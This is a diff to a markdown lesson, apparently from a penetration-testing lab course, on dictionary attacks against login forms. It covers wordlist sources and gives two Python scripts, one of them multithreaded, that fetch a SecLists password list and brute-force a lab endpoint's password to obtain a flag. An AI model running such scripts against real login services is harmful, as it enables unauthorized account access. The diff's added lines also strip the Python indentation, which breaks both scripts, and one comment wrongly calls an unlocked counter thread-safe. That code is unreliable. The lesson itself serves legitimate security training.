@@ -12,7 +12,7 @@ At its core, the concept of a dictionary attack is rooted in understanding human
 
 The fundamental distinction between a brute-force and a dictionary attack lies in their methodology for generating potential password candidates:
 
-- `Brute Force`: A pure brute-force attack systematically testsÂ _every possible combination_Â of characters within a predetermined set and length. While this approach guarantees eventual success given enough time, it can be extremely time-consuming, particularly against longer or complex passwords.
+- `Brute Force`: A pure brute-force attack systematically tests _every possible combination_ of characters within a predetermined set and length. While this approach guarantees eventual success given enough time, it can be extremely time-consuming, particularly against longer or complex passwords.
 - `Dictionary Attack`: In stark contrast, a dictionary attack employs a pre-compiled list of words and phrases, dramatically reducing the search space. This targeted methodology results in a far more efficient and rapid attack, especially when the target password is suspected to be a common word or phrase.
 
 |Feature|Dictionary Attack|Brute Force Attack|Explanation|
@@ -35,10 +35,10 @@ By deploying this targeted wordlist in a dictionary attack, the attacker signifi
 
 Wordlists can be obtained from various sources, including:
 
-- `Publicly Available Lists`: The internet hosts a plethora of freely accessible wordlists, encompassing collections of commonly used passwords, leaked credentials from data breaches, and other potentially valuable data. Repositories likeÂ [SecLists](https://github.com/danielmiessler/SecLists/tree/master/Passwords)Â offer various wordlists catering to various attack scenarios.
+- `Publicly Available Lists`: The internet hosts a plethora of freely accessible wordlists, encompassing collections of commonly used passwords, leaked credentials from data breaches, and other potentially valuable data. Repositories like [SecLists](https://github.com/danielmiessler/SecLists/tree/master/Passwords) offer various wordlists catering to various attack scenarios.
 - `Custom-Built Lists`: Penetration testers can craft their wordlists by leveraging information gleaned during the reconnaissance phase. This might include details about the target's interests, hobbies, personal information, or any other data for password creation.
 - `Specialized Lists`: Wordlists can be further refined to target specific industries, applications, or even individual companies. These specialized lists increase the likelihood of success by focusing on passwords that are more likely to be used within a particular context.
-- `Pre-existing Lists`: Certain tools and frameworks come pre-packaged with commonly used wordlists. For instance, penetration testing distributions like ParrotSec often include wordlists likeÂ `rockyou.txt`, a massive collection of leaked passwords, readily available for use.
+- `Pre-existing Lists`: Certain tools and frameworks come pre-packaged with commonly used wordlists. For instance, penetration testing distributions like ParrotSec often include wordlists like`rockyou.txt`, a massive collection of leaked passwords, readily available for use.
 
 Here is a table of some of the more useful wordlists for login brute-forcing:
 
@@ -56,35 +56,35 @@ Here is a table of some of the more useful wordlists for login brute-forcing:
 
 The instance application creates a route (`/dictionary`) that handles POST requests. It expects a `password` parameter in the request's form data. Upon receiving a request, it compares the submitted password against the expected value. If there's a match, it responds with a JSON object containing a success message and the flag. Otherwise, it returns an error message with a 401 status code (Unauthorized).
 
-Copy and paste this Python script below asÂ `dictionary-solver.py`Â onto your machine. You only need to modify the IP and port variables to match your target system information.
+Copy and paste this Python script below as`dictionary-solver.py` onto your machine. You only need to modify the IP and port variables to match your target system information.
 
 ```python
 import requests
 
-ip = "127.0.0.1"  # Change this to your instance IP address
-port = 1234       # Change this to your instance port number
+ip = "127.0.0.1" # Change this to your instance IP address
+port = 1234 # Change this to your instance port number
 
 # Download a list of common passwords from the web and split it into lines
 passwords = requests.get("https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/500-worst-passwords.txt").text.splitlines()
 
 # Try each password from the list
 for password in passwords:
-    print(f"Attempted password: {password}")
+ print(f"Attempted password: {password}")
 
-    # Send a POST request to the server with the password
-    response = requests.post(f"http://{ip}:{port}/dictionary", data={'password': password})
+ # Send a POST request to the server with the password
+ response = requests.post(f"http://{ip}:{port}/dictionary", data={'password': password})
 
-    # Check if the server responds with success and contains the 'flag'
-    if response.ok and 'flag' in response.json():
-        print(f"Correct password found: {password}")
-        print(f"Flag: {response.json()['flag']}")
-        break
+ # Check if the server responds with success and contains the 'flag'
+ if response.ok and 'flag' in response.json():
+ print(f"Correct password found: {password}")
+ print(f"Flag: {response.json()['flag']}")
+ break
 ```
 
 The Python script orchestrates the dictionary attack. It performs the following steps:
 
-1. `Downloads the Wordlist`: First, the script fetches a wordlist of 500 commonly used (and therefore weak) passwords from SecLists using theÂ `requests`Â library.
-2. `Iterates and Submits Passwords`: It then iterates through each password in the downloaded wordlist. For each password, it sends a POST request to the Flask application'sÂ `/dictionary`Â endpoint, including the password in the request's form data.
+1. `Downloads the Wordlist`: First, the script fetches a wordlist of 500 commonly used (and therefore weak) passwords from SecLists using the`requests` library.
+2. `Iterates and Submits Passwords`: It then iterates through each password in the downloaded wordlist. For each password, it sends a POST request to the Flask application's`/dictionary` endpoint, including the password in the request's form data.
 3. `Analyzes Responses`: The script checks the response status code after each request. If it's 200 (OK), it examines the response content further. If the response contains the "flag" key, it signifies a successful login. The script then prints the discovered password and the captured flag.
 4. `Continues or Terminates`: If the response doesn't indicate success, the script proceeds to the next password in the wordlist. This process continues until the correct password is found or the entire wordlist is exhausted.
 
@@ -115,8 +115,8 @@ import time
 
 ip = "94.237.53.18"
 port = 42926
-MAX_THREADS = 50  # Optimal for network I/O bound tasks
-BATCH_SIZE = 100  # Number of passwords to process before reporting progress
+MAX_THREADS = 50 # Optimal for network I/O bound tasks
+BATCH_SIZE = 100 # Number of passwords to process before reporting progress
 
 # Create a persistent session with connection pooling
 session = requests.Session()
@@ -126,62 +126,62 @@ session.mount('http://', adapter)
 # Get password list with timeout and retry logic
 passwords = []
 try:
-    resp = session.get(
-        "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/500-worst-passwords.txt",
-        timeout=10
-    )
-    passwords = resp.text.splitlines()
+ resp = session.get(
+ "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/500-worst-passwords.txt",
+ timeout=10
+ )
+ passwords = resp.text.splitlines()
 except Exception as e:
-    print(f"Failed to fetch passwords: {str(e)}")
-    exit(1)
+ print(f"Failed to fetch passwords: {str(e)}")
+ exit(1)
 
 found_flag = None
 attempt_count = 0
 start_time = time.time()
 
 def test_password(password):
-    global found_flag, attempt_count
-    if found_flag:
-        return
-    
-    try:
-        # Stream response to handle large responses efficiently
-        with session.post(
-            f"http://{ip}:{port}/dictionary",
-            data={'password': password},
-            timeout=5,
-            stream=True
-        ) as response:
-            if response.ok:
-                json_response = response.json()
-                if 'flag' in json_response:
-                    found_flag = (password, json_response['flag'])
-    
-    except Exception as e:
-        pass  # Silent error handling for speed
-    
-    # Thread-safe counter update and progress reporting
-    attempt_count += 1
-    if attempt_count % BATCH_SIZE == 0:
-        elapsed = time.time() - start_time
-        print(f"\rAttempts: {attempt_count} | Speed: {attempt_count/elapsed:.2f} req/sec | Last tried: {password}", end="")
+ global found_flag, attempt_count
+ if found_flag:
+ return
+ 
+ try:
+ # Stream response to handle large responses efficiently
+ with session.post(
+ f"http://{ip}:{port}/dictionary",
+ data={'password': password},
+ timeout=5,
+ stream=True
+ ) as response:
+ if response.ok:
+ json_response = response.json()
+ if 'flag' in json_response:
+ found_flag = (password, json_response['flag'])
+ 
+ except Exception as e:
+ pass # Silent error handling for speed
+ 
+ # Thread-safe counter update and progress reporting
+ attempt_count += 1
+ if attempt_count % BATCH_SIZE == 0:
+ elapsed = time.time() - start_time
+ print(f"\rAttempts: {attempt_count} | Speed: {attempt_count/elapsed:.2f} req/sec | Last tried: {password}", end="")
 
 # Use executor for optimal thread management
 with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
-    # Submit all passwords at once for maximum parallelism
-    futures = [executor.submit(test_password, pwd) for pwd in passwords]
-    
-    # Monitor completion
-    while not any(f.done() and found_flag for f in futures):
-        if all(f.done() for f in futures):
-            break
-        time.sleep(0.1)
+ # Submit all passwords at once for maximum parallelism
+ futures = [executor.submit(test_password, pwd) for pwd in passwords]
+ 
+ # Monitor completion
+ while not any(f.done() and found_flag for f in futures):
+ if all(f.done() for f in futures):
+ break
+ time.sleep(0.1)
 
 if found_flag:
-    print(f"\n\n[SUCCESS] Password: {found_flag[0]}")
-    print(f"[FLAG] {found_flag[1]}")
+ print(f"\n\n[SUCCESS] Password: {found_flag[0]}")
+ print(f"[FLAG] {found_flag[1]}")
 else:
-    print("\n\n[FAILURE] No valid password found in the list")
+ print("\n\n[FAILURE] No valid password found in the list")
 ```
 
 
